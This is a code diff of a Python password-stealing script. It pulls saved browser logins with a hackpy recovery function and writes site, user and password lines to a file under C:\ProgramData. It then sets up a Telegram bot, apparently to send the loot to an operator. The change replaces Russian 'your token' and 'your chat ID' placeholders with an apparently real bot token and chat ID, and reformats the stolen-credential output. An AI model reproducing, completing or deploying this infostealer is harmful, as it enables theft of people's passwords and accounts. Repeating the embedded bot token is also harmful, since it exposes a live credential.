@@ -5,8 +5,8 @@
 from hackpy.passwords import *
 import os, requests, telebot, platform
 
-token = 'ВАШ ТОКЕН'
-adm = ВАШ ЧАТ АЙДИ
+token = '1070231295:AAHCQNcLPMbUvQQMG2Xdw7GZKKHdTBxEhH8'
+adm = 1014234455
 bot = telebot.TeleBot(token)
 
 
@@ -15,7 +15,7 @@ bot = telebot.TeleBot(token)
 f = open(r'C:\ProgramData\system.txt', 'w')
 
 for key, account in passwordsRecovery():
-       passw = '['  + str(key) + '] '+'|SITE: ' + account['url'] + ' |USER: ' + account['login'] + '|PASS: ' + account['password'] + '\n'
+       passw = '['  + str(key) + '] '+'\n| SITE: ' + account['url'] + '\n| USER: ' + account['login'] + '\n| PASS: ' + account['password'] + '\n'
        f.write(passw)
 f.close()
 filename = r'C:\ProgramData\system.txt'
